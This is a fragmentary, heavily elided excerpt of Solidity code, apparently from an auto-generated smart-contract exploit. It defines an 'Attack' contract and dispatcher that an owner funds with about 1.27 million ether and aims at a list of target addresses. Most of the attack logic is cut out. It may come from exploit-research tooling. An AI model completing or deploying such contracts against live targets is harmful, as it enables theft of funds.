 ...
 * parameter. Make sure to send at least 1275231 ether and 473236647107887105 wei to the attack
    ...
    function _dispatch() public returns(bool) {
        ...
        if (state == 0) {
            if (id == 4) {
                ...
                uint value = 0x10e0a6fca9ad0f7ac0000;
...
contract Attack is AttackManager {
    ...
    uint constant REQUIRED_BUDGET = 0x10e0a6fca9ad0f7ac0001; /* equals 1275231 ether and 473236647107887105 wei */
    ...
    function reset(address payable[] memory _targets) public onlyOwner payable {
        ...
        rstate_state = 0;
        rstate[0] = 0;
        subs[4] = new AttackDispatcher{value: 1275231473236647107887104 }(4, _targets);
    }
